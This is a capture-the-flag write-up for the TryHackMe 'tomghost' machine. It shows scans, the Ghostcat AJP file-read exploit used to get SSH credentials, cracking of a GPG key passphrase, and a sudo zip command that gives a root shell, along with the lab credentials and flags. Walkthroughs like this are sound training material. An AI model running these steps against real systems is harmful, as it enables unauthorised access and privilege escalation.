# tomghost

## Task 1 -- Flags
```
export IP=10.10.44.2
```

Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 13:20 MDT
Nmap scan report for 10.10.44.2
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.13 seconds
```

Initial gobuster scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.44.2:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/31 13:21:16 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/favicon.ico (Status: 200)
/host-manager (Status: 302)
/manager (Status: 302)
===============================================================
2020/05/31 13:22:22 Finished
===============================================================
```


### 1 - Compromise this machine and obtain user.txt
Doing some research on tomcat 9.0.30, we can see in the [changelogs](https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.31) that there is a vulnerability when using the Apache JServ Protocol (AJP) that we found running on port 8009, will allow us to read local files. Looking in searchsploit for ajp, we can find an exploit script `multiple/webapps/48143.py`:

```bash
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ searchsploit ajp
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
AjPortal2Php - 'PagePrefix' Remote File Inclusion                                                                                                                                                          | php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                                                                                                          | multiple/webapps/48143.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

After running this script we are able to access a local file that contains the SSH credentials to a user:

```bash
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ python /usr/share/exploitdb/exploits/multiple/webapps/48143.py $IP
Getting resource at ajp13://10.10.44.2:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

Now we can ssh to the box with `skyfuck:8730281lkjlkjdqlksalks`. Once we log in we see there is an encrypted credentials file and a private key in skyfuck's home directory, but no user flag.

```bash
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ ssh $IP -l skyfuck
skyfuck@10.10.213.225's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Sun May 31 13:03:07 2020 from 10.8.21.42
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

Looking around in the home directory we find another user `merlin`, that has the user flag. And we can read from it!

```bash
skyfuck@ubuntu:~$ cd ..
skyfuck@ubuntu:/home$ ls
merlin  skyfuck
skyfuck@ubuntu:/home$ ls merlin/
user.txt
skyfuck@ubuntu:/home$ cat merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

### 2 - Escalate privileges and obtain root.txt

At first I started running linpeas and looking for typical ways of privilege escalation on linux, but to no avail. There didn't seem to be any SUID binaries to abuse, no faulty permissions, or any other low hanging fruit for linux privesc. Then I went back and looked at the encrypted credentials file in skyfuck's home directory. We have the private key and can import that using gpg and try to decrypt the file:

```bash
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
skyfuck@ubuntu:~$ gpg --import tryhackme.asc
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

Now when trying to decrypt the `credentials.gpg` file, it looks like the private key was password protected:

```bash
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
Enter passphrase:
```

We can copy the private key file to our local machine and use `gpg2john` to make a hash out of the private key file to crack the password:

```bash
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ /opt/JohnTheRipper/run/gpg2john tryhackme.asc >> for_john

File tryhackme.asc
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ cat for_john
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

Running JtR on this file using rockyou.txt takes no more than 10 seconds, and now we have the password to the private key:

```bash
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ /opt/JohnTheRipper/run/john for_john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:01 DONE (2020-05-31 14:08) 0.8547g/s 916.2p/s 916.2c/s 916.2C/s marshall..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now, going back to the server and trying to decrypt the `credentials.pgp` file once more, we now have the credentials for merlin:

```bash
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

So once we log in as the merlin user, we can find immediately our path to root. `zip` is a SUID binary that merlin can run to escalate to the root user.
```bash
jeffrowell@kali:~/Documents/TryHackMe/tomghost$ ssh $IP -l merlin
merlin@10.10.213.225's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Looking in [GTFOBins](https://gtfobins.github.io/gtfobins/zip/) we can abuse this zip binary to become root and get the flag:

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```
